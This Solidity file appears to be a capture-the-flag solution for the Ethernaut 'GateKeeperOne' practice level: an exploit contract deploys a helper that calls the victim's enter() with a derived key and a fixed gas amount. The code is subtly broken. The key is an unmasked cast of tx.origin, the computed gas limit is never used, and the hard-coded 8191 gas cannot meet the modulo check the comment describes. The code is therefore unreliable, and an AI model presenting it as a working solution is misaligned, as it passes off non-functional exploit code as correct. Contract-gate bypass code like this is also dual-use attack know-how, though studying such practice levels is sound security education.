// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperOne/GateKeeperOne.sol";

contract GateKeeperOneExploit {
    GateKeeperOne victim;
    address public owner;

    constructor(address _victim) {
        victim = GateKeeperOne(payable(_victim));
        owner = msg.sender;
    }

    function hack() public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)));
        // Calculate the required gas by ensuring gasleft % 8191 == 0
        uint256 gasLimit = 8191 * 10000; // Adjust multiplier as needed
        // Deploy a helper contract to bypass gateOne and gateTwo
        new Helper(victim, gateKey, owner);
    }

    receive() external payable {}
}

contract Helper {
    constructor(GateKeeperOne _victim, bytes8 _gateKey, address _owner) {
        // Adjust gas to satisfy gateTwo
        _victim.enter{gas: 8191}(_gateKey);
    }
}